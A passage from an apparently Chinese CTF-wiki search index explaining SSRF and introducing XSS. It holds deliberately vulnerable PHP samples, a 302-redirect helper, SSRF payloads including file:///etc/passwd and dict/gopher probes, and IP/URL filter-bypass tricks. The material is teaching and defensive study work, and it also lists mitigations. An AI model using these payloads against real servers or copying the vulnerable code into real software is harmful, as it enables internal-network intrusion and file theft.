\u6839\u636e\u670d\u52a1\u5668\u7684\u8fd4\u56de\u4fe1\u606f\u8fdb\u884c\u5224\u65ad\uff0c\u5927\u90e8\u5206\u5e94\u7528\u4e0d\u4f1a\u5224\u522b\u7aef\u53e3\uff0c\u53ef\u901a\u8fc7\u8fd4\u56de\u7684 banner \u4fe1\u606f\u5224\u65ad\u7aef\u53e3\u72b6\u6001\u3002 \u540e\u7aef\u5b9e\u73b0 <?php if ( isset ( $_POST [ 'url' ])) { $link = $_POST [ 'url' ]; $filename = './curled/' . rand () . 'txt' ; $curlobj = curl_init ( $link ); $fp = fopen ( $filename , \"w\" ); curl_setopt ( $curlobj , CURLOPT_FILE , $fp ); curl_setopt ( $curlobj , CURLOPT_HEADER , 0 ); curl_exec ( $curlobj ); curl_close ( $curlobj ); fclose ( $fp ); $fp = fopen ( $filename , \"r\" ); $result = fread ( $fp , filesize ( $filename )); fclose ( $fp ); echo $result ; } ?> \u6784\u9020\u4e00\u4e2a\u524d\u7aef\u9875\u9762 < html > < body > < form name = \"px\" method = \"post\" action = \"http://127.0.0.1/ss.php\" > < input type = \"text\" name = \"url\" value = \"\" > < input type = \"submit\" name = \"commit\" value = \"submit\" > </ form > < script ></ script > </ body > </ html > \u8bf7\u6c42\u975e HTTP \u7684\u7aef\u53e3\u53ef\u4ee5\u8fd4\u56de banner \u4fe1\u606f\u3002 \u6216\u53ef\u5229\u7528 302 \u8df3\u8f6c\u7ed5\u8fc7 HTTP \u534f\u8bae\u7684\u9650\u5236\u3002 \u8f85\u52a9\u811a\u672c <?php $ip = $_GET [ 'ip' ]; $port = $_GET [ 'port' ]; $scheme = $_GET [ 's' ]; $data = $_GET [ 'data' ]; header ( \"Location: $scheme :// $ip : $port / $data \" ); ?> \u817e\u8baf\u67d0\u5904 SSRF \u6f0f\u6d1e\uff08\u975e\u5e38\u597d\u7684\u5229\u7528\u70b9\uff09\u9644\u5229\u7528\u811a\u672c \u534f\u8bae\u5229\u7528 \u00b6 Dict \u534f\u8bae dict://fuzz.wuyun.org:8080/helo:dict Gopher \u534f\u8bae gopher://fuzz.wuyun.org:8080/gopher File \u534f\u8bae file:///etc/passwd \u7ed5\u8fc7\u59ff\u52bf \u00b6 \u66f4\u6539IP\u5730\u5740\u5199\u6cd5 \u4f8b\u5982 192.168.0.1 8\u8fdb\u5236\u683c\u5f0f\uff1a 0300.0250.0.1 16\u8fdb\u5236\u683c\u5f0f\uff1a 0xC0.0xA8.0.1 10\u8fdb\u5236\u6574\u6570\u683c\u5f0f\uff1a 3232235521 16\u8fdb\u5236\u6574\u6570\u683c\u5f0f\uff1a 0xC0A80001 \u8fd8\u6709\u4e00\u79cd\u7279\u6b8a\u7684\u7701\u7565\u6a21\u5f0f\uff0c\u4f8b\u5982 10.0.0.1 \u8fd9\u4e2aIP\u53ef\u4ee5\u5199\u6210 10.1 \u5229\u7528URL\u89e3\u6790\u95ee\u9898 \u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u540e\u7aef\u7a0b\u5e8f\u53ef\u80fd\u4f1a\u5bf9\u8bbf\u95ee\u7684URL\u8fdb\u884c\u89e3\u6790\uff0c\u5bf9\u89e3\u6790\u51fa\u6765\u7684host\u5730\u5740\u8fdb\u884c\u8fc7\u6ee4\u3002\u8fd9\u65f6\u5019\u53ef\u80fd\u4f1a\u51fa\u73b0\u5bf9URL\u53c2\u6570\u89e3\u6790\u4e0d\u5f53\uff0c\u5bfc\u81f4\u53ef\u4ee5\u7ed5\u8fc7\u8fc7\u6ee4\u3002 \u4f8b\u5982\uff1a http://www.baidu.com@192.168.0.1/ \u4e0e http://192.168.0.1 \u8bf7\u6c42\u7684\u90fd\u662f 192.168.0.1 \u7684\u5185\u5bb9 \u53ef\u4ee5\u6307\u5411\u4efb\u610fip\u7684\u57df\u540d xip.io \uff1a http://127.0.0.1.xip.io/ ==> http://127.0.0.1/ \u77ed\u5730\u5740 http://dwz.cn/11SMa ==> http://127.0.0.1 \u5229\u7528\u53e5\u53f7 \u3002 \uff1a 127\u30020\u30020\u30021 ==> 127.0.0.1 \u5229\u7528Enclosed alphanumerics \u24d4\u24e7\u24d0\u24dc\u24df\u24db\u24d4.\u24d2\u24de\u24dc >>> example.com List: \u2460 \u2461 \u2462 \u2463 \u2464 \u2465 \u2466 \u2467 \u2468 \u2469 \u246a \u246b \u246c \u246d \u246e \u246f \u2470 \u2471 \u2472 \u2473 \u2474 \u2475 \u2476 \u2477 \u2478 \u2479 \u247a \u247b \u247c \u247d \u247e \u247f \u2480 \u2481 \u2482 \u2483 \u2484 \u2485 \u2486 \u2487 \u2488 \u2489 \u248a \u248b \u248c \u248d \u248e \u248f \u2490 \u2491 \u2492 \u2493 \u2494 \u2495 \u2496 \u2497 \u2498 \u2499 \u249a \u249b \u249c \u249d \u249e \u249f \u24a0 \u24a1 \u24a2 \u24a3 \u24a4 \u24a5 \u24a6 \u24a7 \u24a8 \u24a9 \u24aa \u24ab \u24ac \u24ad \u24ae \u24af \u24b0 \u24b1 \u24b2 \u24b3 \u24b4 \u24b5 \u24b6 \u24b7 \u24b8 \u24b9 \u24ba \u24bb \u24bc \u24bd \u24be \u24bf \u24c0 \u24c1 \u24c2 \u24c3 \u24c4 \u24c5 \u24c6 \u24c7 \u24c8 \u24c9 \u24ca \u24cb \u24cc \u24cd \u24ce \u24cf \u24d0 \u24d1 \u24d2 \u24d3 \u24d4 \u24d5 \u24d6 \u24d7 \u24d8 \u24d9 \u24da \u24db \u24dc \u24dd \u24de \u24df \u24e0 \u24e1 \u24e2 \u24e3 \u24e4 \u24e5 \u24e6 \u24e7 \u24e8 \u24e9 \u24ea \u24eb \u24ec \u24ed \u24ee \u24ef \u24f0 \u24f1 \u24f2 \u24f3 \u24f4 \u24f5 \u24f6 \u24f7 \u24f8 \u24f9 \u24fa \u24fb \u24fc \u24fd \u24fe \u24ff \u5371\u5bb3 \u00b6 \u53ef\u4ee5\u5bf9\u5916\u7f51\u3001\u670d\u52a1\u5668\u6240\u5728\u5185\u7f51\u3001\u672c\u5730\u8fdb\u884c\u7aef\u53e3\u626b\u63cf\uff0c\u83b7\u53d6\u4e00\u4e9b\u670d\u52a1\u7684banner\u4fe1\u606f; \u653b\u51fb\u8fd0\u884c\u5728\u5185\u7f51\u6216\u672c\u5730\u7684\u5e94\u7528\u7a0b\u5e8f\uff08\u6bd4\u5982\u6ea2\u51fa\uff09; \u5bf9\u5185\u7f51web\u5e94\u7528\u8fdb\u884c\u6307\u7eb9\u8bc6\u522b\uff0c\u901a\u8fc7\u8bbf\u95ee\u9ed8\u8ba4\u6587\u4ef6\u5b9e\u73b0; \u653b\u51fb\u5185\u5916\u7f51\u7684web\u5e94\u7528\uff0c\u4e3b\u8981\u662f\u4f7f\u7528get\u53c2\u6570\u5c31\u53ef\u4ee5\u5b9e\u73b0\u7684\u653b\u51fb\uff08\u6bd4\u5982struts2\uff0csqli\u7b49\uff09; \u5229\u7528file\u534f\u8bae\u8bfb\u53d6\u672c\u5730\u6587\u4ef6\u7b49\u3002 \u53c2\u8003\u8d44\u6599 \u00b6 \u300aBuild Your SSRF EXP Autowork\u300b\u732a\u732a\u4fa0 \u817e\u8baf\u67d0\u5904 SSRF \u6f0f\u6d1e\uff08\u975e\u5e38\u597d\u7684\u5229\u7528\u70b9\uff09\u9644\u5229\u7528\u811a\u672c bilibili \u67d0\u5206\u7ad9\u4ece\u4fe1\u606f\u6cc4\u9732\u5230 ssrf \u518d\u5230\u547d\u4ee4\u6267\u884c","title":"SSRF"},{"location":"web/ssrf/#ssrf","text":"","title":"SSRF"},{"location":"web/ssrf/#ssrf_1","text":"SSRF\uff0cServer-Side Request Forgery\uff0c\u670d\u52a1\u7aef\u8bf7\u6c42\u4f2a\u9020\uff0c\u662f\u4e00\u79cd\u7531\u653b\u51fb\u8005\u6784\u9020\u5f62\u6210\u7531\u670d\u52a1\u5668\u7aef\u53d1\u8d77\u8bf7\u6c42\u7684\u4e00\u4e2a\u6f0f\u6d1e\u3002\u4e00\u822c\u60c5\u51b5\u4e0b\uff0cSSRF \u653b\u51fb\u7684\u76ee\u6807\u662f\u4ece\u5916\u7f51\u65e0\u6cd5\u8bbf\u95ee\u7684\u5185\u90e8\u7cfb\u7edf\u3002 \u6f0f\u6d1e\u5f62\u6210\u7684\u539f\u56e0\u5927\u591a\u662f\u56e0\u4e3a\u670d\u52a1\u7aef\u63d0\u4f9b\u4e86\u4ece\u5176\u4ed6\u670d\u52a1\u5668\u5e94\u7528\u83b7\u53d6\u6570\u636e\u7684\u529f\u80fd\u4e14\u6ca1\u6709\u5bf9\u76ee\u6807\u5730\u5740\u4f5c\u8fc7\u6ee4\u548c\u9650\u5236\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528 SSRF \u5b9e\u73b0\u7684\u653b\u51fb\u4e3b\u8981\u6709 5 \u79cd\uff1a \u53ef\u4ee5\u5bf9\u5916\u7f51\u3001\u670d\u52a1\u5668\u6240\u5728\u5185\u7f51\u3001\u672c\u5730\u8fdb\u884c\u7aef\u53e3\u626b\u63cf\uff0c\u83b7\u53d6\u4e00\u4e9b\u670d\u52a1\u7684 banner \u4fe1\u606f \u653b\u51fb\u8fd0\u884c\u5728\u5185\u7f51\u6216\u672c\u5730\u7684\u5e94\u7528\u7a0b\u5e8f\uff08\u6bd4\u5982\u6ea2\u51fa\uff09 \u5bf9\u5185\u7f51 WEB \u5e94\u7528\u8fdb\u884c\u6307\u7eb9\u8bc6\u522b\uff0c\u901a\u8fc7\u8bbf\u95ee\u9ed8\u8ba4\u6587\u4ef6\u5b9e\u73b0 \u653b\u51fb\u5185\u5916\u7f51\u7684 web \u5e94\u7528\uff0c\u4e3b\u8981\u662f\u4f7f\u7528 GET \u53c2\u6570\u5c31\u53ef\u4ee5\u5b9e\u73b0\u7684\u653b\u51fb\uff08\u6bd4\u5982 Struts2\uff0csqli \u7b49\uff09 \u5229\u7528 file \u534f\u8bae\u8bfb\u53d6\u672c\u5730\u6587\u4ef6\u7b49","title":"SSRF \u7b80\u4ecb"},{"location":"web/ssrf/#ssrf_2","text":"\u80fd\u591f\u5bf9\u5916\u53d1\u8d77\u7f51\u7edc\u8bf7\u6c42\u7684\u5730\u65b9\uff0c\u5c31\u53ef\u80fd\u5b58\u5728 SSRF \u6f0f\u6d1e \u4ece\u8fdc\u7a0b\u670d\u52a1\u5668\u8bf7\u6c42\u8d44\u6e90\uff08Upload from URL\uff0cImport & Export RSS Feed\uff09 \u6570\u636e\u5e93\u5185\u7f6e\u529f\u80fd\uff08Oracle\u3001MongoDB\u3001MSSQL\u3001Postgres\u3001CouchDB\uff09 Webmail \u6536\u53d6\u5176\u4ed6\u90ae\u7bb1\u90ae\u4ef6\uff08POP3\u3001IMAP\u3001SMTP\uff09 \u6587\u4ef6\u5904\u7406\u3001\u7f16\u7801\u5904\u7406\u3001\u5c5e\u6027\u4fe1\u606f\u5904\u7406\uff08ffmpeg\u3001ImageMagic\u3001DOCX\u3001PDF\u3001XML\uff09","title":"SSRF \u6f0f\u6d1e\u51fa\u73b0\u7684\u573a\u666f"},{"location":"web/ssrf/#_1","text":"file_get_contents <?php if ( isset ( $_POST [ 'url' ])) { $content = file_get_contents ( $_POST [ 'url' ]); $filename = './images/' . rand () . ';img1.jpg' ; file_put_contents ( $filename , $content ); echo $_POST [ 'url' ]; $img = \"<img src= \\\" \" . $filename . \" \\\" />\" ; } echo $img ; ?> \u8fd9\u6bb5\u4ee3\u7801\u4f7f\u7528 file_get_contents \u51fd\u6570\u4ece\u7528\u6237\u6307\u5b9a\u7684 URL \u83b7\u53d6\u56fe\u7247\u3002\u7136\u540e\u628a\u5b83\u7528\u4e00\u4e2a\u968f\u673a\u6587\u4ef6\u540d\u4fdd\u5b58\u5728\u786c\u76d8\u4e0a\uff0c\u5e76\u5c55\u793a\u7ed9\u7528\u6237\u3002 fsockopen() <?php function GetFile ( $host , $port , $link ) { $fp = fsockopen ( $host , intval ( $port ), $errno , $errstr , 30 ); if ( ! $fp ) { echo \" $errstr (error number $errno ) \\n \" ; } else { $out = \"GET $link HTTP/1.1 \\r\\n \" ; $out .= \"Host: $host\\r\\n \" ; $out .= \"Connection: Close \\r\\n\\r\\n \" ; $out .= \" \\r\\n \" ; fwrite ( $fp , $out ); $contents = '' ; while ( ! feof ( $fp )) { $contents .= fgets ( $fp , 1024 ); } fclose ( $fp ); return $contents ; } } ?> \u8fd9\u6bb5\u4ee3\u7801\u4f7f\u7528 fsockopen \u51fd\u6570\u5b9e\u73b0\u83b7\u53d6\u7528\u6237\u5236\u5b9a URL \u7684\u6570\u636e\uff08\u6587\u4ef6\u6216\u8005 HTML\uff09\u3002\u8fd9\u4e2a\u51fd\u6570\u4f1a\u4f7f\u7528 socket \u8ddf\u670d\u52a1\u5668\u5efa\u7acb TCP \u8fde\u63a5\uff0c\u4f20\u8f93\u539f\u59cb\u6570\u636e\u3002 curl_exec() <?php if ( isset ( $_POST [ 'url' ])) { $link = $_POST [ 'url' ]; $curlobj = curl_init (); curl_setopt ( $curlobj , CURLOPT_POST , 0 ); curl_setopt ( $curlobj , CURLOPT_URL , $link ); curl_setopt ( $curlobj , CURLOPT_RETURNTRANSFER , 1 ); $result = curl_exec ( $curlobj ); curl_close ( $curlobj ); $filename = './curled/' . rand () . '.txt' ; file_put_contents ( $filename , $result ); echo $result ; } ?> \u4f7f\u7528 curl \u83b7\u53d6\u6570\u636e\u3002","title":"\u5e38\u7528\u7684\u540e\u7aef\u5b9e\u73b0"},{"location":"web/ssrf/#ssrf_3","text":"\u670d\u52a1\u5668\u5f00\u542f OpenSSL \u65e0\u6cd5\u8fdb\u884c\u4ea4\u4e92\u5229\u7528 \u670d\u52a1\u7aef\u9700\u8981\u9274\u6743\uff08Cookies & User\uff1aPass\uff09\u4e0d\u80fd\u5b8c\u7f8e\u5229\u7528 \u9650\u5236\u8bf7\u6c42\u7684\u7aef\u53e3\u4e3ahttp\u5e38\u7528\u7684\u7aef\u53e3\uff0c\u6bd4\u5982\uff0c80,443,8080,8090\u3002 \u7981\u7528\u4e0d\u9700\u8981\u7684\u534f\u8bae\u3002\u4ec5\u4ec5\u5141\u8bb8http\u548chttps\u8bf7\u6c42\u3002\u53ef\u4ee5\u9632\u6b62\u7c7b\u4f3c\u4e8efile:///,gopher://,ftp:// \u7b49\u5f15\u8d77\u7684\u95ee\u9898\u3002 \u7edf\u4e00\u9519\u8bef\u4fe1\u606f\uff0c\u907f\u514d\u7528\u6237\u53ef\u4ee5\u6839\u636e\u9519\u8bef\u4fe1\u606f\u6765\u5224\u65ad\u8fdc\u7aef\u670d\u52a1\u5668\u7684\u7aef\u53e3\u72b6\u6001\u3002","title":"\u963b\u788d SSRF \u6f0f\u6d1e\u5229\u7528\u7684\u573a\u666f"},{"location":"web/ssrf/#ssrf_4","text":"\u6839\u636e\u670d\u52a1\u5668\u7684\u8fd4\u56de\u4fe1\u606f\u8fdb\u884c\u5224\u65ad\uff0c\u5927\u90e8\u5206\u5e94\u7528\u4e0d\u4f1a\u5224\u522b\u7aef\u53e3\uff0c\u53ef\u901a\u8fc7\u8fd4\u56de\u7684 banner \u4fe1\u606f\u5224\u65ad\u7aef\u53e3\u72b6\u6001\u3002 \u540e\u7aef\u5b9e\u73b0 <?php if ( isset ( $_POST [ 'url' ])) { $link = $_POST [ 'url' ]; $filename = './curled/' . rand () . 'txt' ; $curlobj = curl_init ( $link ); $fp = fopen ( $filename , \"w\" ); curl_setopt ( $curlobj , CURLOPT_FILE , $fp ); curl_setopt ( $curlobj , CURLOPT_HEADER , 0 ); curl_exec ( $curlobj ); curl_close ( $curlobj ); fclose ( $fp ); $fp = fopen ( $filename , \"r\" ); $result = fread ( $fp , filesize ( $filename )); fclose ( $fp ); echo $result ; } ?> \u6784\u9020\u4e00\u4e2a\u524d\u7aef\u9875\u9762 < html > < body > < form name = \"px\" method = \"post\" action = \"http://127.0.0.1/ss.php\" > < input type = \"text\" name = \"url\" value = \"\" > < input type = \"submit\" name = \"commit\" value = \"submit\" > </ form > < script ></ script > </ body > </ html > \u8bf7\u6c42\u975e HTTP \u7684\u7aef\u53e3\u53ef\u4ee5\u8fd4\u56de banner \u4fe1\u606f\u3002 \u6216\u53ef\u5229\u7528 302 \u8df3\u8f6c\u7ed5\u8fc7 HTTP \u534f\u8bae\u7684\u9650\u5236\u3002 \u8f85\u52a9\u811a\u672c <?php $ip = $_GET [ 'ip' ]; $port = $_GET [ 'port' ]; $scheme = $_GET [ 's' ]; $data = $_GET [ 'data' ]; header ( \"Location: $scheme :// $ip : $port / $data \" ); ?> \u817e\u8baf\u67d0\u5904 SSRF \u6f0f\u6d1e\uff08\u975e\u5e38\u597d\u7684\u5229\u7528\u70b9\uff09\u9644\u5229\u7528\u811a\u672c","title":"\u5229\u7528 SSRF \u8fdb\u884c\u7aef\u53e3\u626b\u63cf"},{"location":"web/ssrf/#_2","text":"Dict \u534f\u8bae dict://fuzz.wuyun.org:8080/helo:dict Gopher \u534f\u8bae gopher://fuzz.wuyun.org:8080/gopher File \u534f\u8bae file:///etc/passwd","title":"\u534f\u8bae\u5229\u7528"},{"location":"web/ssrf/#_3","text":"\u66f4\u6539IP\u5730\u5740\u5199\u6cd5 \u4f8b\u5982 192.168.0.1 8\u8fdb\u5236\u683c\u5f0f\uff1a 0300.0250.0.1 16\u8fdb\u5236\u683c\u5f0f\uff1a 0xC0.0xA8.0.1 10\u8fdb\u5236\u6574\u6570\u683c\u5f0f\uff1a 3232235521 16\u8fdb\u5236\u6574\u6570\u683c\u5f0f\uff1a 0xC0A80001 \u8fd8\u6709\u4e00\u79cd\u7279\u6b8a\u7684\u7701\u7565\u6a21\u5f0f\uff0c\u4f8b\u5982 10.0.0.1 \u8fd9\u4e2aIP\u53ef\u4ee5\u5199\u6210 10.1 \u5229\u7528URL\u89e3\u6790\u95ee\u9898 \u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u540e\u7aef\u7a0b\u5e8f\u53ef\u80fd\u4f1a\u5bf9\u8bbf\u95ee\u7684URL\u8fdb\u884c\u89e3\u6790\uff0c\u5bf9\u89e3\u6790\u51fa\u6765\u7684host\u5730\u5740\u8fdb\u884c\u8fc7\u6ee4\u3002\u8fd9\u65f6\u5019\u53ef\u80fd\u4f1a\u51fa\u73b0\u5bf9URL\u53c2\u6570\u89e3\u6790\u4e0d\u5f53\uff0c\u5bfc\u81f4\u53ef\u4ee5\u7ed5\u8fc7\u8fc7\u6ee4\u3002 \u4f8b\u5982\uff1a http://www.baidu.com@192.168.0.1/ \u4e0e http://192.168.0.1 \u8bf7\u6c42\u7684\u90fd\u662f 192.168.0.1 \u7684\u5185\u5bb9 \u53ef\u4ee5\u6307\u5411\u4efb\u610fip\u7684\u57df\u540d xip.io \uff1a http://127.0.0.1.xip.io/ ==> http://127.0.0.1/ \u77ed\u5730\u5740 http://dwz.cn/11SMa ==> http://127.0.0.1 \u5229\u7528\u53e5\u53f7 \u3002 \uff1a 127\u30020\u30020\u30021 ==> 127.0.0.1 \u5229\u7528Enclosed alphanumerics \u24d4\u24e7\u24d0\u24dc\u24df\u24db\u24d4.\u24d2\u24de\u24dc >>> example.com List: \u2460 \u2461 \u2462 \u2463 \u2464 \u2465 \u2466 \u2467 \u2468 \u2469 \u246a \u246b \u246c \u246d \u246e \u246f \u2470 \u2471 \u2472 \u2473 \u2474 \u2475 \u2476 \u2477 \u2478 \u2479 \u247a \u247b \u247c \u247d \u247e \u247f \u2480 \u2481 \u2482 \u2483 \u2484 \u2485 \u2486 \u2487 \u2488 \u2489 \u248a \u248b \u248c \u248d \u248e \u248f \u2490 \u2491 \u2492 \u2493 \u2494 \u2495 \u2496 \u2497 \u2498 \u2499 \u249a \u249b \u249c \u249d \u249e \u249f \u24a0 \u24a1 \u24a2 \u24a3 \u24a4 \u24a5 \u24a6 \u24a7 \u24a8 \u24a9 \u24aa \u24ab \u24ac \u24ad \u24ae \u24af \u24b0 \u24b1 \u24b2 \u24b3 \u24b4 \u24b5 \u24b6 \u24b7 \u24b8 \u24b9 \u24ba \u24bb \u24bc \u24bd \u24be \u24bf \u24c0 \u24c1 \u24c2 \u24c3 \u24c4 \u24c5 \u24c6 \u24c7 \u24c8 \u24c9 \u24ca \u24cb \u24cc \u24cd \u24ce \u24cf \u24d0 \u24d1 \u24d2 \u24d3 \u24d4 \u24d5 \u24d6 \u24d7 \u24d8 \u24d9 \u24da \u24db \u24dc \u24dd \u24de \u24df \u24e0 \u24e1 \u24e2 \u24e3 \u24e4 \u24e5 \u24e6 \u24e7 \u24e8 \u24e9 \u24ea \u24eb \u24ec \u24ed \u24ee \u24ef \u24f0 \u24f1 \u24f2 \u24f3 \u24f4 \u24f5 \u24f6 \u24f7 \u24f8 \u24f9 \u24fa \u24fb \u24fc \u24fd \u24fe \u24ff","title":"\u7ed5\u8fc7\u59ff\u52bf"},{"location":"web/ssrf/#_4","text":"\u53ef\u4ee5\u5bf9\u5916\u7f51\u3001\u670d\u52a1\u5668\u6240\u5728\u5185\u7f51\u3001\u672c\u5730\u8fdb\u884c\u7aef\u53e3\u626b\u63cf\uff0c\u83b7\u53d6\u4e00\u4e9b\u670d\u52a1\u7684banner\u4fe1\u606f; \u653b\u51fb\u8fd0\u884c\u5728\u5185\u7f51\u6216\u672c\u5730\u7684\u5e94\u7528\u7a0b\u5e8f\uff08\u6bd4\u5982\u6ea2\u51fa\uff09; \u5bf9\u5185\u7f51web\u5e94\u7528\u8fdb\u884c\u6307\u7eb9\u8bc6\u522b\uff0c\u901a\u8fc7\u8bbf\u95ee\u9ed8\u8ba4\u6587\u4ef6\u5b9e\u73b0; \u653b\u51fb\u5185\u5916\u7f51\u7684web\u5e94\u7528\uff0c\u4e3b\u8981\u662f\u4f7f\u7528get\u53c2\u6570\u5c31\u53ef\u4ee5\u5b9e\u73b0\u7684\u653b\u51fb\uff08\u6bd4\u5982struts2\uff0csqli\u7b49\uff09; \u5229\u7528file\u534f\u8bae\u8bfb\u53d6\u672c\u5730\u6587\u4ef6\u7b49\u3002","title":"\u5371\u5bb3"},{"location":"web/ssrf/#_5","text":"\u300aBuild Your SSRF EXP Autowork\u300b\u732a\u732a\u4fa0 \u817e\u8baf\u67d0\u5904 SSRF \u6f0f\u6d1e\uff08\u975e\u5e38\u597d\u7684\u5229\u7528\u70b9\uff09\u9644\u5229\u7528\u811a\u672c bilibili \u67d0\u5206\u7ad9\u4ece\u4fe1\u606f\u6cc4\u9732\u5230 ssrf \u518d\u5230\u547d\u4ee4\u6267\u884c","title":"\u53c2\u8003\u8d44\u6599"},{"location":"web/xss/","text":"XSS \u00b6 XSS \u7b80\u4ecb \u00b6 \u8de8\u7ad9\u811a\u672c\uff08Cross-Site Scripting\uff0cXSS\uff09\u662f\u4e00\u79cd\u7ecf\u5e38\u51fa\u73b0\u5728 WEB \u5e94\u7528\u7a0b\u5e8f\u4e2d\u7684\u8ba1\u7b97\u673a\u5b89\u5168\u6f0f\u6d1e\uff0c\u662f\u7531\u4e8e WEB \u5e94\u7528\u7a0b\u5e8f\u5bf9\u7528\u6237\u7684\u8f93\u5165\u8fc7\u6ee4\u4e0d\u8db3\u800c\u4ea7\u751f\u7684\u3002\u653b\u51fb\u8005\u5229\u7528\u7f51\u7ad9\u6f0f\u6d1e\u628a\u6076\u610f\u7684\u811a\u672c\u4ee3\u7801\u6ce8\u5165\u5230\u7f51\u9875\u4e2d\uff0c\u5f53\u5176\u4ed6\u7528\u6237\u6d4f\u89c8\u8fd9\u4e9b\u7f51\u9875\u65f6\uff0c\u5c31\u4f1a\u6267\u884c\u5176\u4e2d\u7684\u6076\u610f\u4ee3\u7801\uff0c\u5bf9\u53d7\u5bb3\u7528\u6237\u53ef\u80fd\u91c7\u53d6 Cookies \u8d44\u6599\u7a83\u53d6\u3001\u4f1a\u8bdd\u52ab\u6301\u3001\u9493\u9c7c\u6b3a\u9a97\u7b49\u5404\u79cd\u653b\u51fb\u3002 \u53cd\u5c04\u578b XSS \u00b6 \u53cd\u5c04\u578b\u8de8\u7ad9\u811a\u672c\uff08Reflected Cross-Site Scripting\uff09\u662f\u6700\u5e38\u89c1\uff0c\u4e5f\u662f\u4f7f\u7528\u6700\u5e7f\u7684\u4e00\u79cd\uff0c\u53ef\u5c06\u6076\u610f\u811a\u672c\u9644\u52a0\u5230 URL \u5730\u5740\u7684\u53c2\u6570\u4e2d\u3002 \u53cd\u5c04\u578b XSS \u7684\u5229\u7528\u4e00\u822c\u662f\u653b\u51fb\u8005\u901a\u8fc7\u7279\u5b9a\u624b\u6cd5\uff08\u5982\u7535\u5b50\u90ae\u4ef6\uff09\uff0c\u8bf1\u4f7f\u7528\u6237\u53bb\u8bbf\u95ee\u4e00\u4e2a\u5305\u542b\u6076\u610f\u4ee3\u7801\u7684 URL\uff0c\u5f53\u53d7\u5bb3\u8005\u70b9\u51fb\u8fd9\u4e9b\u4e13\u95e8\u8bbe\u8ba1\u7684\u94fe\u63a5\u7684\u65f6\u5019\uff0c\u6076\u610f\u4ee3\u7801\u4f1a\u76f4\u63a5\u5728\u53d7\u5bb3\u8005\u4e3b\u673a\u4e0a\u7684\u6d4f\u89c8\u5668\u6267\u884c\u3002\u6b64\u7c7b XSS \u901a\u5e38\u51fa\u73b0\u5728\u7f51\u7ad9\u7684\u641c\u7d22\u680f\u3001\u7528\u6237\u767b\u5f55\u53e3\u7b49\u5730\u65b9\uff0c\u5e38\u7528\u6765\u7a83\u53d6\u5ba2\u6237\u7aef Cookies \u6216\u8fdb\u884c\u9493\u9c7c\u6b3a\u9a97\u3002 \u670d\u52a1\u5668\u7aef\u4ee3\u7801\uff1a <?php // Is there any input? if ( array_key_exists ( \"name\" , $_GET ) && $_GET [ 'name' ] != NULL ) { // Feedback for end user echo '<pre>Hello ' . $_GET [ 'name' ] . '</pre>' ; } ?> \u53ef\u4ee5\u770b\u5230\uff0c\u4ee3\u7801\u76f4\u63a5\u5f15\u7528\u4e86 name \u53c2\u6570\uff0c\u5e76\u6ca1\u6709\u505a\u4efb\u4f55\u7684\u8fc7\u6ee4\u548c\u68c0\u67e5\uff0c\u5b58\u5728\u660e\u663e\u7684 XSS \u6f0f\u6d1e\u3002 \u6301\u4e45\u578b XSS \u00b6 \u6301\u4e45\u578b\u8de8\u7ad9\u811a\u672c\uff08Persistent Cross-Site Scripting\uff09\u4e5f\u7b49\u540c\u4e8e\u5b58\u50a8\u578b\u8de8\u7ad9\u811a\u672c\uff08Stored Cross-Site Scripting\uff09\u3002 \u6b64\u7c7b XSS \u4e0d\u9700\u8981\u7528\u6237\u5355\u51fb\u7279\u5b9a URL \u5c31\u80fd\u6267\u884c\u8de8\u7ad9\u811a\u672c\uff0c\u653b\u51fb\u8005\u4e8b\u5148\u5c06\u6076\u610f\u4ee3\u7801\u4e0a\u4f20\u6216\u50a8\u5b58\u5230\u6f0f\u6d1e\u670d\u52a1\u5668\u4e2d\uff0c\u53ea\u8981\u53d7\u5bb3\u8005\u6d4f\u89c8\u5305\u542b\u6b64\u6076\u610f\u4ee3\u7801\u7684\u9875\u9762\u5c31\u4f1a\u6267\u884c\u6076\u610f\u4ee3\u7801\u3002\u6301\u4e45\u578b XSS \u4e00\u822c\u51fa\u73b0\u5728\u7f51\u7ad9\u7559\u8a00\u3001\u8bc4\u8bba\u3001\u535a\u5ba2\u65e5\u5fd7\u7b49\u4ea4\u4e92\u5904\uff0c\u6076\u610f\u811a\u672c\u5b58\u50a8\u5230\u5ba2\u6237\u7aef\u6216\u8005\u670d\u52a1\u7aef\u7684\u6570\u636e\u5e93\u4e2d\u3002 \u670d\u52a1\u5668\u7aef\u4ee3\u7801\uff1a <?php if ( isset ( $_POST [ 'btnSign' ] ) ) { // Get input $message = trim ( $_POST [ 'mtxMessage' ] ); $name = trim ( $_POST [ 'txtName' ] ); // Sanitize message input $message = stripslashes ( $message ); $message = mysql_real_escape_string ( $message ); // Sanitize name input $name = mysql_real_escape_string ( $name ); // Update database $query = \"INSERT INTO guestbook ( comment, name ) VALUES ( ' $message ', ' $name ' );\" ; $result = mysql_query ( $query ) or die ( '<pre>' . mysql_error () . '</pre>' ); //mysql_close(); } ?> \u4ee3\u7801\u53ea\u5bf9\u4e00\u4e9b\u7a7a\u767d\u7b26\u3001\u7279\u6b8a\u7b26\u53f7\u3001\u53cd\u659c\u6760\u8fdb\u884c\u4e86\u5220\u9664\u6216\u8f6c\u4e49\uff0c\u6ca1\u6709\u505a XSS \u7684\u8fc7\u6ee4\u548c\u68c0\u67e5\uff0c\u4e14\u5b58\u50a8\u5728\u6570\u636e\u5e93\u4e2d\uff0c\u660e\u663e\u5b58\u5728\u5b58\u50a8\u578b XSS \u6f0f\u6d1e\u3002 DOM XSS \u00b6 \u4f20\u7edf\u7684 XSS \u6f0f\u6d1e\u4e00\u822c\u51fa\u73b0\u5728\u670d\u52a1\u5668\u7aef\u4ee3\u7801\u4e2d\uff0c\u800c DOM-Based XSS \u662f\u57fa\u4e8e DOM \u6587\u6863\u5bf9\u8c61\u6a21\u578b\u7684\u4e00\u79cd\u6f0f\u6d1e\uff0c\u6240\u4ee5\uff0c\u53d7\u5ba2\u6237\u7aef\u6d4f\u89c8\u5668\u7684\u811a\u672c\u4ee3\u7801\u6240\u5f71\u54cd\u3002\u5ba2\u6237\u7aef JavaScript \u53ef\u4ee5\u8bbf\u95ee\u6d4f\u89c8\u5668\u7684 DOM \u6587\u672c\u5bf9\u8c61\u6a21\u578b\uff0c\u56e0\u6b64\u80fd\u591f\u51b3\u5b9a\u7528\u4e8e\u52a0\u8f7d\u5f53\u524d\u9875\u9762\u7684 